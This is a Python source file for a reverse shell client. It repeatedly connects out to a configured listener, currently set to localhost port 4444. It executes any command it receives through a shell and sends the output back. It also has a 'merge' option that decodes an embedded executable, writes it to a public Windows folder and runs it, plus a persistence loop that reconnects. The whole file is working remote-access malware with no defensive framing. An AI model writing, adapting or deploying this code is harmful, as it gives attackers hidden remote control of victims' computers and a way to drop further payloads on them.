
import socket,time,os,threading,binascii
from subprocess import Popen,PIPE

ip = '127.0.0.1'
port = 4444
persistence = 0
merge = 0
exe_cryptdata = b''

def create_socket(ip,port):
	client = socket.socket()
	client.settimeout(10)
	return client	

def openExe(exe_cryptdata):
	exe_data = binascii.unhexlify(exe_cryptdata.encode())	
	with open('c:\\users\\public\\TempControl.exe','wb') as exefile:
		exefile.write(exe_data)
	Popen('start c:\\users\\public\\TempControl.exe',shell=1,stdout=PIPE,stderr=PIPE,stdin=PIPE).communicate()

if merge:
	threading.Thread(target=openExe,args=(exe_cryptdata,)).start()

while 1:
	try:
		client = create_socket(ip,port)
		client.connect((ip,port))
		client.settimeout(200)
	except KeyboardInterrupt: break
	except Exception:
		time.sleep(1)
		continue

	#system_name,username = os.popen("whoami").read().strip().split('\\')
	system_name,username = Popen("whoami",shell=1,stdout=PIPE,stderr=PIPE,stdin=PIPE).communicate()[0].strip().split(b'\\')

	while 1:
		try:
			client.send(username+b'@'+system_name+b':~$ ')
			command = client.recv(1024).decode().strip()
			resp = b"          "

			if command=='exit':
				client.send(b'[*] exit code')
				break
			elif command.startswith("cd "):
				direc = command.split(" ")[1]
				if not os.path.isdir(direc):
					resp = b'[!] directory not found'
				else:
					os.chdir(direc)
			elif command=='endsession':
				persistence = False
				client.send(b'[*] session ended')
				break
			else:
				cmmd = Popen(command,shell=1,stdout=PIPE,stderr=PIPE,stdin=PIPE).communicate()[0].strip()
				if cmmd!=b"": 
					resp = cmmd

			client.send(resp)

		except KeyboardInterrupt: break
		except Exception as er:
			print('error: '+str(er))
			if str(er)=='timed out': break
			time.sleep(4)

	client.close()
	if not persistence: break
	print('*')
	time.sleep(5)

